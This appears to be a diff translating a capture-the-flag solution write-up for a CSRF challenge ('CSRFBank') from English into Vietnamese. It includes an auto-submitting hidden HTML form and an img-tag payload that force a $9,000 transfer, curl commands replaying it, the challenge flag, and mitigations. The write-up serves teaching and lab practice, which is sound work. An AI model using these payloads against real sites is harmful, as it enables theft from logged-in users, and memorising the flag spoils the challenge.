@@ -1,77 +1,76 @@
-# Challenge 14: CSRFBank - Solution
+# Thử thách 14: CSRFBank - Giải pháp
 
-## Vulnerability Type
-**Cross-Site Request Forgery (CSRF)**
+## Loại lỗ hổng
+**Cross-Site Request Forgery (CSRF - Giả mạo yêu cầu chéo trang)**
 
-## Description
-The application's transfer functionality lacks CSRF protection, allowing attackers to forge requests that transfer money from a victim's account.
+## Mô tả
+Chức năng chuyển tiền của ứng dụng ngân hàng này hoàn toàn không có cơ chế bảo vệ CSRF. Điều này cho phép kẻ tấn công tạo ra một trang web độc hại, và lừa nạn nhân truy cập vào để tự động thực hiện lệnh chuyển tiền từ tài khoản của họ sang cho kẻ tấn công.
 
-## Vulnerable Code
+## Mã nguồn chứa lỗ hổng
 ```python
 # VULNERABLE: No CSRF token, no Referer check, accepts cross-origin POST
 @app.route("/transfer", methods=["POST"])
 def transfer():
     if "user" not in session: return redirect("/")
-    # ... processes transfer without CSRF validation
+    # ... thực hiện chuyển tiền mà không xác thực token CSRF
 ```
 
-## Exploitation Steps
+## Khai thác (Exploit)
 
-### Step 1: Understand the Goal
-- You're logged in as `bob` with $500
-- Alice has $10,000 and the flag
-- You need $9,000+ to get the flag
-- You need to trick Alice into transferring money to you
+### Bước 1: Thu thập thông tin mục tiêu
+- Bạn đăng nhập vào tài khoản `bob` và có $500 trong số dư.
+- Tài khoản `alice` có $10,000 và đang giữ Flag.
+- Bạn cần có hơn $9,000 để đủ điều kiện mua Flag.
+- Kế hoạch: Lừa Alice chuyển $9,000 sang cho bạn.
 
-### Step 2: Create Malicious HTML Page
-Create `csrf_attack.html`:
+### Bước 2: Tạo trang HTML độc hại chứa payload
+Tạo một file có tên `csrf_attack.html`:
 ```html
 <!DOCTYPE html>
 <html>
 <head><title>Free Prize!</title></head>
 <body>
-<h1>Congratulations! Click to claim your prize!</h1>
+<h1>Chúc mừng! Bạn đã trúng thưởng, hãy nhấp vào đây để nhận giải!</h1>
+<!-- Gửi POST request ẩn tới server mục tiêu -->
 <form id="csrf" action="http://[TARGET_HOST]/transfer" method="POST">
   <input type="hidden" name="to" value="bob">
   <input type="hidden" name="amount" value="9000">
 </form>
 <script>
-  // Auto-submit the form
+  // Tự động submit form ngay khi trang được load
   document.getElementById('csrf').submit();
 </script>
 </body>
 </html>
 ```
 
-### Step 3: Host the Malicious Page
-Host this HTML file on a web server or use a service like:
-- Python: `python -m http.server 8000`
-- Or use online HTML hosting
+### Bước 3: Đưa trang web lên môi trường online (Hosting)
+- Dùng Python để host tại máy cục bộ: `python -m http.server 8000`
+- Hoặc đưa lên các nền tảng host HTML miễn phí.
 
-### Step 4: Trick Alice to Visit
-In a real scenario, you'd send Alice the link. For this CTF:
-1. Login as Alice (use `/alice-visits` endpoint if available)
-2. Or simulate: Open the malicious page while logged in as Alice
-3. The form auto-submits
-4. Money transfers from Alice to Bob
+### Bước 4: Lừa Alice nhấp vào link
+Trong thực tế, bạn sẽ gửi đường link này qua email hoặc chat cho Alice. Đối với hệ thống CTF:
+1. Đăng nhập dưới tài khoản Alice (hoặc dùng endpoint `/alice-visits` do hệ thống cung cấp).
+2. Mô phỏng việc Alice mở trang web độc hại của bạn khi cô ấy vẫn đang giữ session đăng nhập ngân hàng.
+3. Form sẽ tự động submit ngầm.
+4. Tiền từ Alice sẽ chuyển thẳng sang Bob.
 
-### Step 5: Get the Flag
-1. Login as Bob
-2. Check balance (should be $9,500)
-3. The flag appears on the dashboard
+### Bước 5: Lấy Flag
+1. Đăng nhập lại dưới tư cách Bob.
+2. Kiểm tra số dư (bây giờ sẽ là $9,500).
+3. Đổi tiền lấy Flag trên giao diện (dashboard).
 
-## Alternative: Using Image Tag
+## Cách thay thế: Dùng thẻ <img> (Chỉ áp dụng nếu endpoint hỗ trợ GET)
 ```html
 <img src="http://[TARGET_HOST]/transfer?to=bob&amount=9000" style="display:none">
 ```
-(Only works if the endpoint accepts GET requests)
 
-## Using curl to Simulate
+## Khai thác tự động bằng cURL
 ```bash
-# Login as Alice first to get session cookie
+# Đăng nhập Alice để lấy cookie phiên (session)
 curl -c cookies.txt -d "username=alice&password=alice123" http://[host]/login
 
-# Perform transfer (simulating CSRF)
+# Kích hoạt lệnh chuyển tiền chéo trang (Mô phỏng CSRF)
 curl -b cookies.txt -d "to=bob&amount=9000" http://[host]/transfer
 ```
 
@@ -80,24 +79,22 @@ curl -b cookies.txt -d "to=bob&amount=9000" http://[host]/transfer
 FCTF{csrf_n0_t0k3n_n0_s3cur1ty}
 ```
 
-## How It Works
-- CSRF exploits the browser's automatic cookie sending
-- When Alice visits the malicious page, her browser sends her session cookie
-- The server sees a valid session and processes the transfer
-- Alice never intended to make the transfer
+## Cách hoạt động
+- Lỗ hổng CSRF lợi dụng hành vi tự động đính kèm Cookie của trình duyệt vào các HTTP request.
+- Khi Alice vô tình ghé thăm trang web độc hại, trình duyệt của Alice sẽ tự động gửi kèm cookie ngân hàng (session hợp lệ) tới đường dẫn `/transfer`.
+- Server thấy cookie hợp lệ nên xử lý lệnh chuyển tiền một cách ngoan ngoãn.
+- Alice hoàn toàn không biết lệnh chuyển tiền vừa xảy ra ở chế độ chạy ngầm (background).
 
-## Mitigation
-- Implement CSRF tokens:
+## Biện pháp phòng ngừa (Mitigation)
+- Triển khai Anti-CSRF Token ở phía backend:
   ```python
   from flask_wtf.csrf import CSRFProtect
   csrf = CSRFProtect(app)
   ```
-- Verify Referer/Origin headers
-- Use SameSite cookie attribute:
+- Kiểm tra chặt chẽ các header HTTP như `Origin` và `Referer`.
+- Sử dụng cờ bảo mật `SameSite` cho Cookie để ngăn trình duyệt đính kèm cookie trên các request chéo domain:
   ```python
-  app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
+  app.config['SESSION_COOKIE_SAMESITE'] = 'Lax' # Hoặc 'Strict'
   ```
-- Require re-authentication for sensitive operations
-- Use custom headers (X-Requested-With)
-- Implement double-submit cookie pattern
-- Add CAPTCHA for critical operations
+- Yêu cầu xác thực lại (nhập mật khẩu, mã OTP) cho các hành động cực kỳ nhạy cảm như chuyển tiền.
+- Sử dụng mô hình Double Submit Cookie.
